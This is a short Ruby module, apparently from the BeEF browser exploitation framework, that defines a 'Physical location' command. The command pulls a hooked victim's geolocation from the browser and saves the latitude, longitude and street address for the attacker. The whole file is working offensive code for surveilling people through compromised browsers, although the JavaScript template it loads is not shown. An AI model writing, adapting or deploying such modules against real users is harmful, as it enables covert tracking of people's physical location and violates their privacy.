class Physical_location < BeEF::Core::Command

  def initialize
    super({
      'Name' => 'Physical location',
      'Description' => %Q{
        This module will retrieve the physical location of the victim using the geolocation API
        },
      'Category' => 'Host',
      'Author' => ['antisnatchor'],
      'File' => __FILE__
    })

    set_target({
      'verified_status' =>  VERIFIED_USER_NOTIFY, 
      'browser_name' =>     ALL
    })

    use 'beef.geolocation'
    use_template!
  end

  def callback
    content = {}
    content['Geolocation Enabled'] = @datastore['geoLocEnabled']
    content['Latitude'] = @datastore['latitude']
    content['Longitude'] = @datastore['longitude']
    content['OSM address'] = @datastore['osm']
    save content
  end

end